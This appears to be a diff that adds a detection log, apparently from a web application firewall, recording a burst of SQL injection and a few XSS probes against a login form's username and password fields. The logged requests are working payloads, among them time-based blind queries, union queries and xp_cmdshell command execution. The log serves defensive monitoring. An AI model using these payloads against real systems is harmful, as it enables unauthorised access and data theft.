@@ -1,0 +1,166 @@
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or 1=1&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=1) or pg_sleep(__TIME__)--&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=benchmark(10000000,MD5(1))#&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=";waitfor delay '0:0:__TIME__'--&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=" or sleep(__TIME__)#&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=pg_sleep(__TIME__)--&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or 0=0 #&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=1) or sleep(__TIME__)#&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=@var select @var as var into temp end --&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=1)) or benchmark(10000000,MD5(1))#&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username="a"" or 3=3--"&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=" or benchmark(10000000,MD5(1))#&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or 0=0 --&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=# from wapiti&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=1 waitfor delay '0:0:10'--&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=hi or 1=1 --"&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=)) or benchmark(10000000,MD5(1))#&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or 1=1&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=")) or benchmark(10000000,MD5(1))#&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=));waitfor delay '0:0:__TIME__'--&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=a' waitfor delay '0:0:10'--&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=or 1=1&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=or 1=1&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= and 1 in (select var from temp)--&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= --&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=1 or sleep(__TIME__)#&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or 1=1 or ''='&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=; exec master..xp_cmdshell 'ping 172.10.1.255'--&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=" or pg_sleep(__TIME__)--&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=x' AND email IS NULL; --&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=1) or benchmark(10000000,MD5(1))#&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username="));waitfor delay '0:0:__TIME__'--&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=or 1=1 --&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=x' AND members.email IS NULL; --&password=asd
+Sun Jun 23 00:29:12 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or 1=1--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=1)) or pg_sleep(__TIME__)--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= union all select @@version--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=1 or benchmark(10000000,MD5(1))#&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or pg_sleep(__TIME__)--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=) or pg_sleep(__TIME__)--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or sleep(__TIME__)#&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= select * from information_schema.tables--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=a' or 1=1--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or a=a--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or 1 --'&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=or 0=0 #"&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=Ã¢ÂÂ or 1=1 --&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= having 1=1--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=) or benchmark(10000000,MD5(1))#&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=;waitfor delay '0:0:__TIME__'--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=" or 1=1--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=x' AND userid IS NULL; --&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or benchmark(10000000,MD5(1))#&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=a' or 3=3--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=");waitfor delay '0:0:__TIME__'--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= -- &password=&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= group by userid having 1=1--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=hi' or 1=1 --&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=") or pg_sleep(__TIME__)--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=ÃÂ½ or 1=1 --&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=0 or 1=1&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=1 or pg_sleep(__TIME__)--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=)) or pg_sleep(__TIME__)--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=' or 1=1&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=x' AND 1=(SELECT COUNT(*) FROM tabname); --&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=1 or 1=1&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=23 OR 1=1&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=or 0=0 --&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=1)) or sleep(__TIME__)#&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=or 0=0 #&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=);waitfor delay '0:0:__TIME__'--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=password:*/=1--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or 1=1 /*&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or 1 in (select @@version)--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=or 1=1 or ""=&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=x' or 1=1 or 'x'='y&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=Ã¢ÂÂ or 3=3 --&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or '1'='1'--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username="a"" or 1=1--"&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=" or 0=0 --&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=")) or pg_sleep(__TIME__)--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=' or 1=1&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or 1=1 --&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username='; exec master..xp_cmdshell 'ping 172.10.1.255'--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=' or 0=0 #&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=' or 0=0 --&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or 0=0 #"&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=' or 1=1--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=' or '1'='1'--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=' or 1 --'&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or 1=1 or ""=&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=t'exec master..xp_cmdshell 'nslookup www.google.com'--&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=--sp_password&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: username=<>"'%;)(&+&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=' or 1=1&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username= or 3=3 --&password=asd
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= or 1=1
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=1) or pg_sleep(__TIME__)--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=" or sleep(__TIME__)#
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= or 1=1
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=")) or benchmark(10000000,MD5(1))#
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=1 or sleep(__TIME__)#
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=or 1=1
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= --
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= and 1 in (select var from temp)--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= or 1=1 or ''='
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=; exec master..xp_cmdshell 'ping 172.10.1.255'--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=" or pg_sleep(__TIME__)--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=x' AND email IS NULL; --
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=1) or benchmark(10000000,MD5(1))#
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=or 1=1 --
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password="));waitfor delay '0:0:__TIME__'--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=x' AND members.email IS NULL; --
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= or 1=1--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=1)) or pg_sleep(__TIME__)--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= union all select @@version--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=1 or benchmark(10000000,MD5(1))#
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= or pg_sleep(__TIME__)--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=) or pg_sleep(__TIME__)--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= or sleep(__TIME__)#
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= select * from information_schema.tables--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=a' or 1=1--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= or a=a--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= or 1 --'
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=or 0=0 #"
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=Ã¢ÂÂ or 1=1 --
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= having 1=1--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=;waitfor delay '0:0:__TIME__'--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=) or benchmark(10000000,MD5(1))#
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=" or 1=1--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=x' AND userid IS NULL; --
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= or benchmark(10000000,MD5(1))#
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= group by userid having 1=1--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=");waitfor delay '0:0:__TIME__'--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=a' or 3=3--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= -- &password=
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=") or pg_sleep(__TIME__)--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=hi' or 1=1 --
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=ÃÂ½ or 1=1 --
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=1 or pg_sleep(__TIME__)--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=0 or 1=1
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=' or 1=1
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=)) or pg_sleep(__TIME__)--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=x' AND 1=(SELECT COUNT(*) FROM tabname); --
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=1 or 1=1
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=23 OR 1=1
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=or 0=0 --
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=or 0=0 #
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=1)) or sleep(__TIME__)#
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=password:*/=1--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=);waitfor delay '0:0:__TIME__'--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=") or benchmark(10000000,MD5(1))#
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= or 1=1 /*
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=or 1=1 or ""=
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= or 1 in (select @@version)--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=x' or 1=1 or 'x'='y
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=" or 0=0 --
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=' or 1=1
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= or 1=1 --
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=' or 1=1--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=' or 0=0 #
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=or 1=1--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= or 1=1 or ""=
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password=' or a=a--
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: username=asd&password=<>"'%;)(&+
+Sun Jun 23 00:29:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd&password= or 3=3 --
